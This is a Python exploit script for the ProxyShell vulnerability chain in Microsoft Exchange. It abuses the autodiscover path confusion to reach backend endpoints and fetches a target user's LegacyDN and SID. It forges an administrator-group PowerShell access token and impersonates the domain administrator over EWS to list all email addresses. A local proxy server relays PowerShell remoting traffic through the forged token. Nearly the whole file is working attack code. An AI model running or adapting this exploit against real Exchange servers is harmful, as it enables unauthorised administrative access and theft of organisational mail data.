#!/usr/bin/env python3

import argparse
import base64
import struct
import random
import string
import requests
import threading
import sys
import time
import xml.etree.ElementTree as ET

from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()

        headers = {
            'Content-Type': content_type
        }

        r = self.proxyshell.post(
            powershell_url,
            post_data,
            headers
        )

        resp = r.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)


class ProxyShell:

    def __init__(self, exchange_url, email, verify=False):

        self.exchange_url = exchange_url if exchange_url.startswith(
            'https://') else f'https://{exchange_url}'
        self.email = email
        self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
        self.sid = None
        self.domain_sid = None
        self.legacydn = None
        self.rand_subj = rand_string(16)

        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers = {
            'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
        }

    def post(self, endpoint, data, headers={}):

        url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers
        )
        return r

    def get_token(self):

        self.token = self.gen_token()

    def get_sid(self):

        data = self.legacydn
        data += '\x00\x00\x00\x00\x00\xe4\x04'
        data += '\x00\x00\x09\x04\x00\x00\x09'
        data += '\x04\x00\x00\x00\x00\x00\x00'

        headers = {
            "X-Requesttype": 'Connect',
            "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            "X-Clientapplication": 'Outlook/15.0.4815.1002',
            "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http'
        }

        r = self.post(
            '/mapi/emsmdb',
            data,
            headers
        )

        self.sid = r.text.split("with SID ")[1].split(
            " and MasterAccountSid")[0]
        self.domain_sid = '-'.join(self.sid.split('-')[:-1])

    def get_legacydn(self):

        data = self.autodiscover_body()
        headers = {'Content-Type': 'text/xml'}
        r = self.post(
            '/autodiscover/autodiscover.xml',
            data,
            headers
        )

        autodiscover_xml = ET.fromstring(r.content)
        self.legacydn = autodiscover_xml.find(
            '{*}Response/{*}User/{*}LegacyDN'
        ).text

    def autodiscover_body(self):

        autodiscover = ET.Element(
            'Autodiscover',
            xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
        )

        request = ET.SubElement(autodiscover, 'Request')
        ET.SubElement(request, 'EMailAddress').text = self.email
        ET.SubElement(
            request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'

        return ET.tostring(
            autodiscover,
            encoding='unicode',
            method='xml'
        )

    def gen_token(self):

        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'

        version_data = b'V' + (1).to_bytes(1, 'little') + \
            (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1,
                                                     'little') + auth_type.encode()
        login_data = b'L' + (len(self.email)).to_bytes(1,
                                                       'little') + self.email.encode()
        user_data = b'U' + (len(self.sid)).to_bytes(1,
                                                    'little') + self.sid.encode()
        group_data = b'G' + \
            struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1,
                                                            'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)

        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data

        data = base64.b64encode(raw_token).decode()

        return data


def rand_string(n=5):

    return ''.join(random.choices(string.ascii_lowercase, k=n))


def exploit(proxyshell):

    proxyshell.get_legacydn()
    print(f'LegacyDN: {proxyshell.legacydn}')

    proxyshell.get_sid()
    print(f'SID: {proxyshell.sid}')

    proxyshell.get_token()
    print(f'Token: {proxyshell.token}')


def get_args():

    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    return parser.parse_args()


def get_emails(proxyshell):

    data = f'''
        <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:SerializedSecurityContext>
      <t:UserSid>{proxyshell.domain_sid}-500</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
 <soap:Body>
    <m:ResolveNames ReturnFullContactData="true">
      <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>

</soap:Envelope>
    '''

    headers = {
        'Content-Type': 'text/xml'
    }

    r = proxyshell.post(
        f'/EWS/exchange.asmx',
        data=data,
        headers=headers
    )

    email_xml = ET.fromstring(r.content)
    emails = email_xml.findall(
        '{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Mailbox/{*}EmailAddress'
    )

    for email in emails:
        print(f'Found address: {email.text}')


def main():
    args = get_args()
    exchange_url = args.u

    proxyshell = ProxyShell(
        exchange_url,
        'FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@lab.local'
    )

    exploit(proxyshell)
    get_emails(proxyshell)


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
    if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
        print("This script requires Python 3.8 or higher!")
        print("You are using Python {}.{}.".format(
            sys.version_info.major, sys.version_info.minor))
        sys.exit(1)
    main()
